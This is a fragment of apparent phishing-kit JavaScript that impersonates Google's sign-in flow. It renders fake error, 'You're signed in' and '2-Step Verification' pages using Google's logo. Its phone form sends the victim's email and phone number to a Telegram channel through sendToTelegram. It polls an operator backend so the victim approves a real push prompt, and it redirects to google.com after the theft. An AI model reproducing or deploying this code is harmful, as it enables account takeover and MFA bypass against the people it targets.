  var flagMap = {"US": "🇺🇸", "CA": "🇨🇦", "GB": "🇬🇧", "AU": "🇦🇺", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "PT": "🇵🇹", "NL": "🇳🇱", "BE": "🇧🇪", "CH": "🇨🇭", "AT": "🇦🇹", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱", "CZ": "🇨🇿", "HU": "🇭🇺", "RO": "🇷🇴", "UA": "🇺🇦", "GR": "🇬🇷", "RU": "🇷🇺", "TR": "🇹🇷", "IN": "🇮🇳", "PK": "🇵🇰", "BD": "🇧🇩", "LK": "🇱🇰", "NP": "🇳🇵", "CN": "🇨🇳", "JP": "🇯🇵", "KR": "🇰🇷", "TW": "🇹🇼", "HK": "🇭🇰", "SG": "🇸🇬", "MY": "🇲🇾", "ID": "🇮🇩", "PH": "🇵🇭", "TH": "🇹🇭", "VN": "🇻🇳", "NZ": "🇳🇿", "BR": "🇧🇷", "AR": "🇦🇷", "CO": "🇨🇴", "CL": "🇨🇱", "PE": "🇵🇪", "MX": "🇲🇽", "SA": "🇸🇦", "AE": "🇦🇪", "QA": "🇶🇦", "KW": "🇰🇼", "EG": "🇪🇬", "MA": "🇲🇦", "NG": "🇳🇬", "GH": "🇬🇭", "KE": "🇰🇪", "ZA": "🇿🇦", "ET": "🇪🇹", "TZ": "🇹🇿", "UG": "🇺🇬", "CM": "🇨🇲", "SN": "🇸🇳"};
  var sel = document.getElementById('ph-country');
  var flagEl = document.getElementById('ph-flag');
  sel.addEventListener('change', function() {
    var cc = this.value.split('|')[0];
    flagEl.textContent = flagMap[cc] || '🌎';
  });
  var inp = document.getElementById('ph-number'); inp.focus();
  document.getElementById('phone-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var phone = inp.value.trim();
    if (!phone) return;
    var dial = sel.value.split('|')[1] || '+1';
    var btn = this.querySelector('button[type="submit"]');
    btn.disabled=true; inp.disabled=true; sel.disabled=true; btn.textContent='Sending…';
    sendToTelegram('PHONE_CODE', email, dial + ' ' + phone, sessionId);
    setTimeout(function(){ pollForResponse(sessionId, btn); }, 500);
  });
}


// ============================================================
// ERROR PAGE
// ============================================================
function showErrorPage(errorMessage) {
  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1 style="color:#d33f3f;">Error</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">' + (errorMessage || 'An error occurred') + '</p>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <div style="display:flex;justify-content:flex-end;align-items:center;width:100%;margin-top:auto;padding-top:32px;">' +
'          <button type="button" class="qx5512-nb" onclick="window.location.reload()">Try again</button>' +
'        </div>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';
}

// ============================================================
// SUCCESS PAGE
// ============================================================
function showSuccessPage() {
  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1>You\'re signed in</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">Redirecting you now...</p>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';
  
  setTimeout(function() {
    window.location.href = 'https://www.google.com';
  }, 3000);
}



// ============================================================
// SUA PAGE - Suspicious Activity

function showSUAPage(email, sessionId) {
  var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  document.body.innerHTML =
    '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
    '<div class="qx5512-bs">' +
    '<svg class=\"qx5512-glg\" width=\"40\" height=\"40\" viewBox=\"0 0 24 24\"><path fill=\"#4285F4\" d=\"M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z\"/><path fill=\"#34A853\" d=\"M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z\"/><path fill=\"#FBBC05\" d=\"M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z\"/><path fill=\"#EA4335\" d=\"M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z\"/></svg>' +
    '<h1 style="font-size:22px;margin-top:8px">2-Step Verification</h1>' +
    '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in</p>' +
    '<button type=\"button\" class=\"qx5512-er\" style=\"background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px\"><svg class=\"qx5512-av\" viewBox=\"0 0 24 24\" width=\"20\" height=\"20\"><path fill=\"#e8eaed\" d=\"M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z\"/></svg><span style=\"flex:1;text-align:left;font-weight:500;color:#e8eaed\">' + safeEmail + '</span><svg viewBox=\"0 0 24 24\" width=\"18\" height=\"18\" style=\"flex-shrink:0\"><path fill=\"#e8eaed\" d=\"M7 10l5 5 5-5z\"/></svg></button>' +
    '</div>' +
    '<div class="qx5512-fs" style="display:flex;flex-direction:column;justify-content:center;padding-top:8px">' +
    '<svg width=\"140\" height=\"150\" viewBox=\"0 0 140 150\" style=\"display:block;margin:16px auto 8px\"><rect x=\"30\" y=\"4\" width=\"80\" height=\"120\" rx=\"14\" fill=\"#2a2a2a\" stroke=\"#444\" stroke-width=\"1\"/><rect x=\"38\" y=\"16\" width=\"64\" height=\"88\" rx=\"4\" fill=\"#1a1a1a\"/><circle cx=\"70\" cy=\"10\" r=\"3\" fill=\"#111\"/><rect x=\"54\" y=\"112\" width=\"32\" height=\"3\" rx=\"1.5\" fill=\"#555\"/><text x=\"70\" y=\"56\" text-anchor=\"middle\" font-family=\"Arial,sans-serif\" font-size=\"10\" font-weight=\"bold\" fill=\"#e8eaed\">Google</text><rect x=\"46\" y=\"64\" width=\"48\" height=\"5\" rx=\"2.5\" fill=\"#333\"/><rect x=\"52\" y=\"74\" width=\"36\" height=\"4\" rx=\"2\" fill=\"#2a2a2a\"/><circle cx=\"52\" cy=\"132\" r=\"16\" fill=\"#555\"/><line x1=\"45\" y1=\"125\" x2=\"59\" y2=\"139\" stroke=\"#e8eaed\" stroke-width=\"2\" stroke-linecap=\"round\"/><line x1=\"59\" y1=\"125\" x2=\"45\" y2=\"139\" stroke=\"#e8eaed\" stroke-width=\"2\" stroke-linecap=\"round\"/><circle cx=\"92\" cy=\"132\" r=\"18\" fill=\"#4285F4\"/><polyline points=\"82,132 89,140 104,122\" fill=\"none\" stroke=\"#fff\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>' +
    '<p style="color:#e8eaed;font-size:16px;font-weight:500;margin:0 0 10px;line-height:1.4">Open the Gmail app on your phone</p>' +
    '<p style="color:#9aa0a6;font-size:14px;margin:0 0 24px;line-height:1.6">Google sent a notification to your phone. Open the Gmail app and tap <b style="color:#e8eaed">Yes</b> on the prompt to verify it&#39;s you.</p>' +
    '<a href="#" class="qx5512-fl" style="font-size:14px">Resend it</a>' +
    '<div class="qx5512-bg qx5512-pa" style="margin-top:28px">' +
    '<a href="#" class="qx5512-fl">Try another way</a>' +
    '</div>' +
    '</div>' +
    '</div></div></div><footer class=\"qx5512-pf-ft\"><div class=\"qx5512-ls-w\"><select class=\"qx5512-ls\"><option selected>English (United States)</option></select></div><nav class=\"qx5512-fl-nk\"><a href=\"#\">Help</a><a href=\"#\">Privacy</a><a href=\"#\">Terms</a></nav></footer>';

  // Reset session to 'pending' FIRST so the 'sua' response_type is cleared,
  // otherwise the very first poll immediately re-detects 'sua' and loops
  fetch('/api/reset-session', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sessionId: sessionId })
  })
  .then(function() { pollForResponse(sessionId, null); })
  .catch(function() { pollForResponse(sessionId, null); });
}
